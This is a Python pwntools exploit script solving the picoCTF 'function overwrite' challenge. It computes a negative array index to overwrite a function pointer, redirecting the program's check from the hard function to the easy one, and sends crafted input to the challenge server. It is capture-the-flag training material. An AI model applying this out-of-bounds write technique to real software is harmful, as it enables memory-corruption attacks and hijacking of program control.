from pwn import *

context.binary = elf = ELF('function overwrite', checksec=True)
io = remote('saturn.picoctf.net', 57023)
EASY_CHECKER = 0x080492FC  # from IDA
HARD_CHECKER = 0x08049436  # from IDA
CHECK = 0x804c040  # from gdb
FUN = 0x804c080  # from gdb
NEG_INDEX = (FUN - CHECK) // 4  # distance between FUN and CHECK, need to overwrite from start of CHECK. BUT because we are writing integers instead of characters, each integer takes up 4 bytes while each chars only 1 byte, so we need to divide this distance by 4.
offset = EASY_CHECKER - HARD_CHECKER
story_len = 1337 // ord('~')
STORY = '~' * story_len
STORY += chr(1337 % ord('~'))
total_score = sum([ord(c) for c in STORY])
print(STORY)
print(total_score)
print(offset)
print(NEG_INDEX)
# Use negative index to overwrite the variable before the fun array to the address of the easy checker
'''
func[NEG_INDEX] = EASY_CHECKER
'''

io.sendline(STORY.encode())
io.sendline(b'-' + str(NEG_INDEX).encode() + b' ' + str(offset).encode())
io.interactive()
